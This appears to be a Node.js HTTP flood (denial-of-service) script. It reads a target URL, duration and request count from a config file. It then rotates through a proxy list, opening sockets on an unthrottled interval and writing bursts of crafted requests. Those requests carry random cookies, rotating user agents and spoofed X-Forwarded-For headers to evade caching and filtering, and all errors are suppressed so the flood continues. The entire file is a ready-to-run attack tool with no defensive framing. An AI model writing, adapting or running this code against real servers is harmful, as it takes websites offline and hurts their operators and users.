const event = require('events')
const fs = require('fs')
const url = require('url')
const net = require('net')

const config = require('../temp.json')

const proxies = fs.readFileSync(__dirname + '/../proxy.txt', 'utf-8').match(/\S+/g)

const emitter = new event()
emitter.setMaxListeners(Number.POSITIVE_INFINITY)

const agents = [
    "Mozilla/5.0 (Linux; Android 6.0.1; SM-G610Y) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 10; Nokia 9) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0; K-KOOL Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; LM-X410.FGN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 6.0; LG-K350) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.67 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 4.4.2; Lenovo A328) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 9; SM-A105FN) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 5.1; 5015D) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36"
]

function gen_cookie() {
    var random = Math.floor(Math.random() * (Math.floor(9999999) - Math.ceil(0))) + Math.ceil(0)
    var random1 = Math.floor(Math.random() * (Math.floor(9999999) - Math.ceil(0))) + Math.ceil(0)
    return `${random}=${random1};${random1}=${random};`
}

var main = setInterval(() => {
    var proxy = proxies[Math.floor(Math.random() * proxies.length)]
    var agent = agents[Math.floor(Math.random() * agents.length)]
    // var cookie = gen_cookie()

    var proxysplit = proxy.split(':')

    var s = net.Socket()
    s.connect(proxysplit[1], proxysplit[0])
    s.setTimeout(15000)

    var payload = `${config.method} ${config.url} HTTP/1.1\r\n`
    payload += `Host: ${url.parse(config.url).host}\r\n`
    payload += `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\n`
    payload += `Accept-Language: en-US,en;q=0.9,he-IL;q=0.8,he;q=0.7,fr;q=0.6\r\n`
    payload += `Accept-Encoding: gzip\r\n`
    payload += `Cache-Control: no-cache\r\n`
    payload += `Pragma: no-cache\r\n`
    payload += `Upgrade-Insecure-Requests: 1\r\n`
    payload += `User-Agent: ${agent}\r\n`
    payload += `Cookie: ${gen_cookie()}\r\n`
    payload += `X-Forwarded-For: ${proxysplit[0]}:${proxysplit[1]}\r\n`
    payload += `X-Forwarded-Proto: https\r\n`
    payload += `Connection: Keep-Alive\r\n\r\n`

    for (var i = 0; i < config.reqpproxy; i++)
        s.write(payload)
})

setTimeout(() => clearInterval(main), config.time * 1000)

process.on('uncaughtException', function (err) {})
process.on('unhandledRejection', function (err) {})